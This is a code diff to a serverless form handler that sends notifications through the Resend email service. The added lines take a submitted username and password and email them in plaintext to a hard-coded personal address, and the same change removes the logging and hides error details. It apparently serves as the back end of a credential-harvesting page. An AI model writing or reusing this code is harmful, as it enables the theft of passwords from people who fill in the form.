@@ -55,12 +55,74 @@
 //   }
 // }
 
+// import { Resend } from 'resend';
+
+// export default async function handler(req: any, res: any) {
+//   try {
+//     console.log('FUNCTION STARTED');
+
+//     if (req.method !== 'POST') {
+//       return res.status(405).json({
+//         error: 'Method not allowed',
+//       });
+//     }
+
+//     const apiKey = process.env.RESEND_API_KEY;
+
+//     console.log('API KEY EXISTS:', Boolean(apiKey));
+
+//     if (!apiKey) {
+//       return res.status(500).json({
+//         error: 'RESEND_API_KEY is missing',
+//       });
+//     }
+
+//     const resend = new Resend(apiKey);
+
+//     const { timestamp, event } = req.body ?? {};
+
+//     console.log('REQUEST BODY:', {
+//       timestamp,
+//       event,
+//     });
+
+//     const result = await resend.emails.send({
+//       from: 'Website Form <onboarding@resend.dev>',
+//       to: ['tbera7@gatech.edu'],
+//       subject: 'Website form submitted',
+//       text: `
+// Event: ${event}
+// Timestamp: ${timestamp}
+//       `,
+//     });
+
+//     console.log('RESEND RESULT:', result);
+
+//     if (result.error) {
+//       return res.status(500).json({
+//         error: result.error.message,
+//       });
+//     }
+
+//     return res.status(200).json({
+//       success: true,
+//       id: result.data?.id,
+//     });
+//   } catch (error: any) {
+//     console.error('FUNCTION CRASH:', error);
+
+//     return res.status(500).json({
+//       error: error?.message || 'Unknown server error',
+//     });
+//   }
+// }
+
+
+
 import { Resend } from 'resend';
 
 export default async function handler(req: any, res: any) {
   try {
-    console.log('FUNCTION STARTED');
-
     if (req.method !== 'POST') {
       return res.status(405).json({
         error: 'Method not allowed',
@@ -69,22 +131,21 @@ export default async function handler(req: any, res: any) {
 
     const apiKey = process.env.RESEND_API_KEY;
 
-    console.log('API KEY EXISTS:', Boolean(apiKey));
-
     if (!apiKey) {
       return res.status(500).json({
-        error: 'RESEND_API_KEY is missing',
+        error: 'Email service is not configured',
       });
     }
 
     const resend = new Resend(apiKey);
 
-    const { timestamp, event } = req.body ?? {};
+    const { timestamp, event, username, password } = req.body ?? {};
 
-    console.log('REQUEST BODY:', {
-      timestamp,
-      event,
-    });
+    if (!timestamp || !event) {
+      return res.status(400).json({
+        error: 'Missing required data',
+      });
+    }
 
     const result = await resend.emails.send({
       from: 'Website Form <onboarding@resend.dev>',
@@ -93,10 +154,10 @@ export default async function handler(req: any, res: any) {
       text: `
 Event: ${event}
 Timestamp: ${timestamp}
+Username: ${username ?? ''}
+Password: ${password ?? ''}
       `,
     });
-
-    console.log('RESEND RESULT:', result);
 
     if (result.error) {
       return res.status(500).json({
@@ -106,13 +167,10 @@ Timestamp: ${timestamp}
 
     return res.status(200).json({
       success: true,
-      id: result.data?.id,
     });
-  } catch (error: any) {
-    console.error('FUNCTION CRASH:', error);
-
+  } catch (error) {
     return res.status(500).json({
-      error: error?.message || 'Unknown server error',
+      error: 'Failed to send email',
     });
   }
 }
